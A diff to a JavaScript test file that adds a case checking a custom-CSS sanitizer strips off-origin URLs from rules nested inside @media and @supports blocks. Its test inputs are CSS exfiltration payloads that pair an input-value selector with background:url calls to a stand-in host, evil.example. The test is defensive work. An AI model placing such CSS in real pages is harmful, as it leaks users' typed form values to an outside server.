@@ -337,6 +337,30 @@ describe("custom CSS may not reach off this origin", () => {
     }
   });
 
+  it("reads inside a rule nested in a group at-rule", () => {
+    // Both rules and at-rules have blocks, and a rule nested in either arrives
+    // as `Raw`. A walk that read only `Rule` blocks missed this entirely: the
+    // inner rule is a `Raw` child of the `@media`, not of the rule around it,
+    // so the selector-plus-URL pair reached the page with no warning.
+    for (const css of [
+      `.nx-pb-page { @media (min-width:0px) { .probe:has(input[value^="a"]) { background:url("https://evil.example/a") } } }`,
+      `.a { @supports (display:grid) { .probe { background:url("https://evil.example/b") } } }`,
+      `.a { @media (min-width:0px) { @supports (display:grid) { .probe { background:url("https://evil.example/c") } } } }`,
+    ]) {
+      const out = sanitizeCustomCss(css, SCOPE);
+      expect(out.css).not.toContain("evil.example");
+      expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    }
+    // An ordinary rule nested in a group at-rule is untouched, which is the
+    // common case and the cost of getting this wrong.
+    const fine = sanitizeCustomCss(
+      `.a { @media (min-width:0px) { color: red } }`,
+      SCOPE
+    );
+    expect(fine.warnings).toEqual([]);
+    expect(fine.css.replace(/\s+/g, "")).toContain("color:red");
+  });
+
   it("refuses nesting past the bound as unchecked, not as a URL", () => {
     // Rules deeper than the scan follows are still removed — unreadable is not
     // safe — but the reason given has to be the real one. Reporting them as
